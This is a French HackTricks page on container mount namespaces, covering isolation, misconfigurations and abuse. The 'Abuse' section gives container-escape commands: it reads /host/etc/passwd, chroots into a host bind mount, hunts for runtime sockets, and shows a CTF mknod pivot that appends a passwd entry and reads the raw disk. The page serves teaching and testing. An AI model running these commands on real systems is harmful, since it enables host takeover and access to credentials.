# Espace de noms de montage

{{#include ../../../../../banners/hacktricks-training.md}}

## Aperçu

L'espace de noms de montage contrôle la **table des montages** que voit un processus. C'est l'une des fonctionnalités d'isolation des containers les plus importantes parce que le système de fichiers racine, les bind mounts, les montages tmpfs, la vue procfs, l'exposition sysfs, et de nombreux montages d'assistance spécifiques au runtime sont tous exprimés via cette table de montages. Deux processus peuvent tous deux accéder à `/`, `/proc`, `/sys`, ou `/tmp`, mais ce à quoi ces chemins correspondent dépend de l'espace de noms de montage dans lequel ils se trouvent.

Du point de vue de la sécurité des containers, l'espace de noms de montage fait souvent la différence entre « ceci est un système de fichiers d'application proprement préparé » et « ce processus peut voir ou influencer directement le système de fichiers hôte ». C'est pourquoi les bind mounts, les volumes `hostPath`, les opérations de montage privilégiées, et les expositions en écriture de `/proc` ou `/sys` gravitent tous autour de cet espace de noms.

## Fonctionnement

Lorsqu'un runtime lance un container, il crée généralement un nouvel espace de noms de montage, prépare un système de fichiers racine pour le container, monte procfs et d'autres systèmes de fichiers d'assistance selon les besoins, puis ajoute éventuellement des bind mounts, des montages tmpfs, des secrets, des config maps, ou des host paths. Une fois que ce processus s'exécute à l'intérieur de l'espace de noms, l'ensemble des montages qu'il voit est en grande partie découplé de la vue par défaut de l'hôte. L'hôte peut encore voir le système de fichiers sous-jacent réel, mais le container voit la version assemblée pour lui par le runtime.

C'est puissant car cela permet au container de croire qu'il possède son propre système de fichiers racine alors que l'hôte gère toujours tout. C'est aussi dangereux, car si le runtime expose un mauvais montage, le processus gagne soudainement en visibilité sur des ressources de l'hôte que le reste du modèle de sécurité n'a peut-être pas été conçu pour protéger.

## Laboratoire

Vous pouvez créer un espace de noms de montage privé avec :
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si vous ouvrez un autre shell en dehors de cet espace de noms et inspectez la table des montages, vous verrez que le montage tmpfs n'existe que dans l'espace de noms de montage isolé. C'est un exercice utile car il montre que l'isolation des montages n'est pas une théorie abstraite : le noyau présente littéralement une table des montages différente au processus.
Si vous ouvrez un autre shell en dehors de cet espace de noms et inspectez la table des montages, le montage tmpfs n'existera que dans l'espace de noms de montage isolé.

À l'intérieur des conteneurs, une comparaison rapide est :
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Le deuxième exemple montre à quel point une configuration runtime peut percer une énorme brèche dans la frontière du système de fichiers.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O s'appuient tous sur un mount namespace privé pour les containers normaux. Kubernetes s'appuie sur le même mécanisme pour les volumes, projected secrets, config maps, et les montages `hostPath`. Incus/LXC environments s'appuient aussi fortement sur les mount namespaces, surtout parce que les system containers exposent souvent des systèmes de fichiers plus riches et plus semblables à une machine que les application containers.

Cela signifie que lorsque vous examinez un problème de filesystem de container, vous n'êtes généralement pas en train d'observer une bizarrerie isolée de Docker. Vous observez un problème de mount-namespace et de runtime-configuration exprimé à travers la plateforme qui a lancé la workload.

## Misconfigurations

La faute la plus évidente et dangereuse est d'exposer le root filesystem de l'hôte ou un autre chemin sensible de l'hôte via un bind mount, par exemple `-v /:/host` ou un `hostPath` inscriptible dans Kubernetes. À ce stade, la question n'est plus « le container peut-il d'une manière ou d'une autre s'échapper ? » mais plutôt « quelle quantité de contenu utile de l'hôte est déjà directement visible et inscriptible ? » Un host bind mount inscriptible transforme souvent le reste de l'exploit en une simple question de placement de fichiers, chrooting, modification de config, ou découverte de sockets runtime.

Un autre problème courant est d'exposer le `/proc` ou le `/sys` de l'hôte d'une manière qui contourne la vue plus sûre fournie au container. Ces filesystems ne sont pas des montages de données ordinaires ; ce sont des interfaces vers l'état du kernel et des processus. Si le workload accède directement aux versions de l'hôte, nombre des hypothèses derrière le durcissement des containers cessent de s'appliquer correctement.

Les protections en lecture seule sont aussi importantes. Un root filesystem en lecture seule ne sécurise pas magiquement un container, mais il retire une grande partie de l'espace de préparation pour l'attaquant et rend la persistance, le placement de helper-binary et l'altération de la config plus difficiles. Inversement, un root inscriptible ou un host bind mount inscriptible donne à l'attaquant de la place pour préparer l'étape suivante.

## Abuse

Quand le mount namespace est mal utilisé, les attaquants font couramment l'une des quatre choses suivantes. Ils **lisent des données de l'hôte** qui auraient dû rester en dehors du container. Ils **modifient la configuration de l'hôte** via des bind mounts inscriptibles. Ils **montent ou remontent des ressources supplémentaires** si les capabilities et seccomp le permettent. Ou ils **atteignent des sockets puissants et des répertoires d'état runtime** qui leur permettent de demander à la plateforme de container elle-même davantage d'accès.

Si le container peut déjà voir le filesystem de l'hôte, le reste du modèle de sécurité change immédiatement.

Quand vous suspectez un host bind mount, confirmez d'abord ce qui est disponible et s'il est inscriptible :
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si le host root filesystem est mounted read-write, l'accès direct au host est souvent aussi simple que :
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si l'objectif est un accès runtime privilégié plutôt que le chrooting direct, énumérez les sockets et l'état runtime :
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` est présent, testez également si de nouveaux mounts peuvent être créés depuis l'intérieur du conteneur :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemple complet : Two-Shell `mknod` Pivot

Une voie d'abus plus spécialisée apparaît lorsque l'utilisateur root du container peut créer des périphériques de bloc, que le host et le container partagent une identité d'utilisateur de manière utile, et que l'attaquant dispose déjà d'une présence peu privilégiée sur le host. Dans cette situation, le container peut créer un nœud de périphérique tel que `/dev/sda`, et l'utilisateur peu privilégié sur le host peut ensuite le lire via `/proc/<pid>/root/` pour le processus container correspondant.

À l'intérieur du container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Depuis l'hôte, en tant qu'utilisateur à faibles privilèges correspondant après avoir localisé le PID du shell du conteneur :
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La leçon importante n'est pas la recherche exacte de chaînes CTF. Il s'agit du fait que l'exposition du mount-namespace via `/proc/<pid>/root/` peut permettre à un utilisateur de l'hôte de réutiliser des nœuds de périphérique créés par le conteneur, même lorsque la politique devices de cgroup empêchait leur utilisation directe à l'intérieur du conteneur.

## Vérifications

Ces commandes servent à vous montrer la vue du système de fichiers dans laquelle le processus courant réside réellement. L'objectif est de repérer les points de montage provenant de l'hôte, les chemins sensibles en écriture, et tout ce qui semble plus étendu qu'un système de fichiers racine typique d'un conteneur d'application.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- Les bind mounts provenant de l'hôte — en particulier `/`, `/proc`, `/sys`, les répertoires d'état runtime ou les emplacements de sockets — doivent ressortir immédiatement.
- Les montages inattendus en lecture-écriture sont généralement plus importants qu'un grand nombre de montages auxiliaires en lecture seule.
- `mountinfo` est souvent le meilleur endroit pour voir si un chemin est vraiment dérivé de l'hôte ou overlay-backed.

Ces vérifications déterminent **quelles ressources sont visibles dans ce namespace**, **lesquelles sont dérivées de l'hôte**, et **lesquelles sont modifiables ou sensibles en termes de sécurité**.
{{#include ../../../../../banners/hacktricks-training.md}}
